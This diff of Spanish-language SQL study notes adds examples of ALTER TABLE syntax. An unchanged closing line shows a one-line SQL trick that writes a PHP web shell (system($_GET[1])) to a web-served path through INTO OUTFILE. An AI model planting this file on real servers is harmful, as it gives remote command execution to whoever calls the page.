@@ -50,7 +50,18 @@
 ### insertar un registro en una tabla:
     INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
 
+---
 
+# Modificar datos
+### Modificar una tabla(nombre, campos, agregar o eliminar una columna)
+    ALTER TABLE <tabla> ADD <nombre_columna> <tipo_de_valor>;
+    ALTER TABLE <tabla> RENAME COLUMN <columna_actual> TO <nuevo_nombre>;
+    ALTER TABLE <tabla> MODIFY <columna a modificar> <tipo de dato al que se cambia>;
+    ALTER TABLE <tabla> DROP <columna>
+
+
+
+    
 
 si somos DBA y sabemos cómo acceder a los archivos desde un servicio web, podemos crear una shell:
 SELECT '<?php system($_GET[1]); ?>' INTO OUTFILE 'path_to_file';
